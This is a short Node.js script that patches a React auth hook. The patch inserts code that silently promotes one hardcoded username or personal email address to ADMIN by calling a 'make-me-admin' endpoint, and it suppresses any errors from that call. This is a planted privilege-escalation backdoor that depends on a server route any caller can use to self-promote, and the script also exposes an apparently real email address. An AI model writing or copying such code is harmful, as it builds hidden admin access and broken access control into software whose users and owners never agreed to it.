const fs = require('fs');
const path = 'src/hooks/useAuthInit.ts';
let content = fs.readFileSync(path, 'utf8');

// I will just replace the exact logic at the fetch /me response
const insertLogic = `
              if (meData.success && mounted) {
                const userData = meData.data;
                // Auto admin logic
                if (userData && (userData.username === 'gencsosyal' || userData.email === 'imranyesildag123@gmail.com') && userData.role !== 'ADMIN') {
                   try {
                     const adminRes = await fetch("/api/v1/auth/make-me-admin", {
                       headers: { "Authorization": \`Bearer \${token}\` }
                     });
                     if (adminRes.ok) {
                       userData.role = 'ADMIN';
                     }
                   } catch (e) {}
                }
                setAuth(userData, token);
                return;
              }
`;
content = content.replace(/if \(meData\.success && mounted\) \{\s*setAuth\(meData\.data, token\);\s*return;\s*\}/, insertLogic);
fs.writeFileSync(path, content);
console.log('useAuthInit.ts patched correctly');
